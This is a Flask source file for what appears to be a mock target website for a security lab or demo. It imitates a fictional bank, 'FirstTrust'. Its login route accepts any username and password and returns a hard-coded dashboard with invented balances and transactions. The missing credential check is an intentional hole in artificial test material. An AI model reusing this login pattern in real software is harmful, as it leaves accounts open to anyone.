from flask import Flask, render_template, request

app = Flask(__name__)


@app.route("/")
def home():
    return render_template("target_dark.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    # Return dark-themed dashboard
    return """<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - FirstTrust</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0f; color: #fff; margin: 0; }
        .header { background: rgba(10,10,15,0.95); backdrop-filter: blur(20px); border-bottom: 1px solid #2a2a3a; padding: 16px 30px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 22px; margin: 0; color: #d4af37; }
        .nav { background: #12121a; border-bottom: 1px solid #2a2a3a; padding: 0 30px; }
        .nav a { display: inline-block; padding: 15px 20px; color: #a0a0b0; text-decoration: none; border-bottom: 3px solid transparent; transition: all 0.3s; }
        .nav a:hover, .nav a.active { color: #fff; border-bottom-color: #d4af37; }
        .container { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
        .alert { background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.3); padding: 16px 20px; border-radius: 10px; margin-bottom: 25px; color: #fbbf24; }
        .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
        .card { background: #1a1a24; padding: 30px; border-radius: 16px; border: 1px solid #2a2a3a; }
        .card h3 { color: #d4af37; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; letter-spacing: 1px; }
        .balance { font-size: 42px; font-weight: 800; color: #fff; }
        .balance-label { color: #6e6e80; font-size: 14px; margin-top: 8px; }
        .tx-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .tx-table th { text-align: left; padding: 14px; border-bottom: 2px solid #2a2a3a; color: #6e6e80; font-size: 13px; text-transform: uppercase; }
        .tx-table td { padding: 14px; border-bottom: 1px solid #22222e; font-size: 14px; color: #a0a0b0; }
        .tx-table tr:hover { background: #22222e; }
        .credit { color: #4ade80; }
        .debit { color: #f87171; }
    </style>
</head>
<body>
    <div class="header">
        <h1>FirstTrust Online Banking</h1>
        <span style="color: #a0a0b0;">Welcome, John D. | Last login: Today 9:42 AM</span>
    </div>
    <div class="nav">
        <a href="#" class="active">Dashboard</a>
        <a href="#">Accounts</a>
        <a href="#">Transfers</a>
        <a href="#">Bill Pay</a>
        <a href="#">Messages</a>
    </div>
    <div class="container">
        <div class="alert">
            <strong>Security Notice:</strong> We have detected unusual login activity on your account. Please review your recent transactions below.
        </div>
        <div class="dashboard-grid">
            <div class="card">
                <h3>Primary Checking</h3>
                <div class="balance">$12,847.32</div>
                <div class="balance-label">Available Balance</div>
            </div>
            <div class="card">
                <h3>Savings Account</h3>
                <div class="balance">$45,200.00</div>
                <div class="balance-label">Current Balance</div>
            </div>
        </div>
        <div class="card" style="margin-top: 25px;">
            <h3>Recent Transactions</h3>
            <table class="tx-table">
                <tr><th>Date</th><th>Description</th><th>Amount</th></tr>
                <tr><td>Jun 20, 2026</td><td>Amazon.com</td><td class="debit">-$127.45</td></tr>
                <tr><td>Jun 19, 2026</td><td>Salary Deposit</td><td class="credit">+$5,200.00</td></tr>
                <tr><td>Jun 18, 2026</td><td>Electric Bill</td><td class="debit">-$89.50</td></tr>
                <tr><td>Jun 17, 2026</td><td>Transfer to Savings</td><td class="debit">-$1,000.00</td></tr>
            </table>
        </div>
    </div>
</body>
</html>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)